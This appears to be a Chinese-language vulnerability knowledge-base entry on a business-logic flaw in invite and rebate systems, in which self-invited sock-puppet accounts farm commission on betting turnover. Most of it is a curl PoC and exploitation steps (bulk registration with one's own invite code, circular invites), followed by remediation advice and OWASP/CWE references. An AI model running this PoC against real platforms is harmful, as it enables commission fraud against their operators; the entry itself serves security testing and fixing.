---
title: 邀请返水自邀循环（小号矩阵刷返水）
cve: 无（业务逻辑）
severity: high
cvss: 8.0
product: 自研代理/邀请体系
versions: 任意
ports: 80, 443
keywords: 邀请, 返水, 代理, 自邀, 循环, 佣金
entry: /api/user/invite 或注册时的 inviteCode
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
POST /api/user/register   {"inviteCode":"XXXX"}
GET  /api/agent/team      → 返回下线列表与流水
GET  /api/agent/commission
```

## 前置条件

- 一个账号；注册支持邀请码；返水按流水比例结算。

## PoC

```bash
# 1) 取自己的邀请码
curl -s https://target/api/user/invite -H "Authorization: Bearer <t>" | jq '.data.code'

# 2) 用小号注册并绑定自己（同 IP/同设备先试，若能过就说明风控缺失）
for i in 1 2 3; do
  curl -s -X POST https://target/api/user/register \
    -H 'Content-Type: application/json' \
    -d "{\"phone\":\"1390000000$i\",\"password\":\"Passw0rd!\",\"inviteCode\":\"<自己的码>\"}"
done

# 3) 小号下注产生流水 → 主号查返水
curl -s https://target/api/agent/commission -H "Authorization: Bearer <t>" | jq
# 判定：返水随小号流水增长 = 命中
```

## 利用步骤

1. 先确认"能否自邀"（同 IP、同一设备指纹）；
2. 小号做最小流水，看返水是否到账（这一步别放大）；
3. 试循环绑（A 邀 B，B 邀 A）与代理层级（下线再邀下线）看是否重复计佣；
4. 证据：邀请关系图 + 返水流水。

## 修复与缓解

- 注册风控：同 IP/设备/支付方式限制；禁止自邀（邀请人与被邀人身份交叉校验）。
- 返水只对"净输"计佣，且加提现前置审核。

## 参考

- OWASP WSTG-BUSL-02；CWE-840。
